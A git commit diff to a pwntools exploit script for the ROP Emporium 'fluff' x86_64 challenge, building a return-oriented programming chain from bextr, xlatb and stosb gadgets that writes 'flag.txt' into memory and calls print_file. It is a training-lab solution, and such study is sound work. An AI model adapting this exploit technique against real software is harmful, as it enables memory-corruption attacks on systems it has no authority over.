89899c3d2222de7b6943b8d0ec0b297a5b9396e6
Calana2 <kalcast00@proton.me>
2025-05-31 20:28:12 -0400

    Update 6-fluff-x86_64.py

--- ROP_Emporium/fluff/6-fluff-x86_64.py
+++ ROP_Emporium/fluff/6-fluff-x86_64.py
@@ -1,10 +1,9 @@
 from pwn import *
-elf = context.binary = ELF("./fluff")
-io = process("./fluff")
-#context.log_level = "debug"
+import sys
 
 data_addr = 0x00601028
 pop_rdi = 0x00000000004006a3         # pop rdi ; ret
+print_file_addr = 0x00400510
 
 write_gadget_1 = 0x0040062a          # pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret
 write_gadget_2 = 0x0000000000400628  # xlatb ; ret
@@ -14,35 +13,31 @@ write_gadget_3 = 0x0000000000400639  # stosb byte ptr [rdi], al ; ret
 char_map = {'f': 0x0040058a, 'l': 0x004003e4, 'a': 0x00400424,
             'g': 0x004003cf, '.': 0x004003fd, 't': 0x004003e0,
             'x': 0x00400725}
+target_str = "flag.txt"
 
 def write_in_data(addrs):
     p = b""
-    for i,read_addr in enumerate(addrs.values()):
+    al = 11
+    for i,char in enumerate(target_str):
+        read_addr = char_map[char]
         # set rbx to read_addr
         # rdx[....|LENGTH|START]  to extract higher 32 bits
         rdx = p8(32) + p8(32) + p32(0) + p16(0)
         # rcx = 0xAAAAAAAA0000000 + 0x3ef2 = 0xAAAAAAAA00003ef2
-        al = 11 + i
         rcx = p32(0) + p32(read_addr - al)
-        p += p64(write_gadget_1)
-        p +=(rdx)
-        p +=(rcx)
+        p += p64(write_gadget_1) + rdx + rcx
         # xlab does al = [rbx+al]
         p += p64(write_gadget_2)
-        p += p64(pop_rdi)
-        p += p64(data_addr + i)
+        p += p64(pop_rdi) + p64(data_addr + i)
         p += p64(write_gadget_3)
-
+        al = ord(char)
     return p
 
 payload = b"A" * 40
 payload += write_in_data(char_map)  
 payload += p64(pop_rdi)
 payload += p64(data_addr)           
-payload += p64(elf.plt['print_file'])
+payload += p64(print_file_addr)
 
-io.recv()
-io.sendline(payload)
-io.interactive()
-
+sys.stdout.buffer.write(payload)
 
